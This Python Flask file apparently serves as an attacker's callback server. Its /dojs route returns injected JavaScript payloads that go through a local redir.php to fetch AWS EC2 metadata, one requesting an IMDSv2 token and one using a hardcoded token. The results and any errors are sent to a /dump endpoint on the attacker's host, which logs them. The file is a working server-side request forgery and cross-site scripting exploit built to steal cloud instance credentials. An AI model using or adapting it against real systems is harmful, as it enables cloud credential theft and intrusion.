from flask import Flask, request, redirect, abort, Response
app = Flask(__name__)

HOST = 'MY_SEVER_ADDRESS'
PORT = 8000

@app.route('/')
def hello():
    return "Hello World!"

@app.route('/dump', methods=['GET', 'POST'])
def dump():
    for x in request.values.get('data',[]).split('\n'):
        print(x)
    return 'OK'

@app.route('/dojs')
def dojs():
    t = int(request.values.get('type', '0'))
    path = request.values.get('path', '')
    data = {
        5: '''
            try {{
                var out='';
                var xhttp = new XMLHttpRequest();

                xhttp.onload = function() {{
                   out = xhttp.response;
                   out += xhttp.status;
                }};

                xhttp.onerror = function() {{
                   out = 'error';
                }};

                xhttp.open('PUT', 'http://127.0.0.1/redir.php?url={1}', false);
                xhttp.setRequestHeader('x-aws-ec2-metadata-token-ttl-seconds', '21600');
                xhttp.send();

                xhttp = new XMLHttpRequest();
                xhttp.open('GET', '{0}?data=' + encodeURIComponent(out), true);
                xhttp.send();
            }} catch(err) {{
                xhttp = new XMLHttpRequest();
                xhttp.open('GET', '{0}?err=' + encodeURIComponent(err), true);
                xhttp.send();
            }}
        ''',
        6: '''
            try {{
                var out='';
                var xhttp = new XMLHttpRequest();

                xhttp.onload = function() {{
                   out = xhttp.response;
                   out += xhttp.status;
                }};

                xhttp.onerror = function() {{
                   out = 'error';
                }};

                xhttp.open('GET', 'http://127.0.0.1/redir.php?url={1}', false);
                xhttp.setRequestHeader('x-aws-ec2-metadata-token', 'AQAEAHGwT3PXn95KUVvwruQseDKLZpQcAAGsVgFcbD93y1fVeRn7rA==');
                xhttp.send();

                xhttp = new XMLHttpRequest();
                xhttp.open('GET', '{0}?data=' + encodeURIComponent(out), true);
                xhttp.send();
            }} catch(err) {{
                xhttp = new XMLHttpRequest();
                xhttp.open('GET', '{0}?err=' + encodeURIComponent(err), true);
                xhttp.send();
            }}
        ''',
    }.get(t, '').format(f'http://{HOST}:{PORT}/dump', path)

    return f'<script>{data}</script>'


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000)
